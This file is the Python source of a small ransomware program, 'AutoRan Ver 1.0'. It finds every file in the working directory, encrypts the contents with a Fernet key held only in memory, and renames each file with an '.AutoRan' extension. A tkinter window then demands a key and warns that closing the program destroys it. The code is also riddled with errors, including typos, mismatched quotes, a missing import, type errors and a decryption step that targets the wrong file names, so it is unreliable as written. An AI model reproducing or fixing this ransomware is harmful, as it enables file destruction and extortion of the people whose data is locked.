from tkinter import *
from cryptography.fernet import Fernet
from tkinter import messagebox
import os
import glob
import random

Encrypt = {}
Files = []
Already = []

Password = ""

for i in range(0, 8):
  Password = Password+"x"+random.randrange(10, 100)

Key = Fernet.generate_key()

F = Fernet(Key)

def Encry():
  try:
    for File in Files:
      with open(File, "r") as fp:
        Data = fp.read()
        Locked = F.encrypt(Data)
        Encrypt[File] = Locked
        os.rename(File, f"{File}.AutoRan")
        FL.insert(END, f"{File} -> {File}.AutoRan")
        fp.close()
  except:
    pass
    
def Decry():
  try:
    for LockData in Encrypt:
      with open(LockData, "w") as fp:
        Data = Encrypt[LockData]
        UnLocked = F.decrypt(Data).decode()
        fp.write(UnLocked)
  except:
    pass

def Search():
  try:
    for File in glob.glob("*.*"):
      Files.append(File)
  except:
    pass

def Scan():
  try:
    if PI.get() == "Password":
      Decry()
      Main.destroy()
      sys.exit(0)
    else:
      pass
  except:
    pass

def Exit():
  messagebox.showinfo("Stop", "If kill this program your key will destroy")

Main = Tk()
Main.title("AutoRan Ver 1.0")
Main.resizeable(False, False)
 
L1 = Label(Main, text="AutoRan Ver 1.0", font=("", 30))
L1.pack()

FL = Listbox(Main, width=100, height=20)
F.pack()

KL = Lael(Main, text="Key ; ", font=("", 15))
KL.pack()
 
PI = Entry(Main)
PI.pack(side="left")    


PI.insert(0, Password)

Enter = Button(Main, width=30, tex="Enter", command=Scan)
Enter.pack(side='left")

Search()
Encry()

Main.protocol("WM_DELETE_WINDOW", Exit)
Main.mainloop()
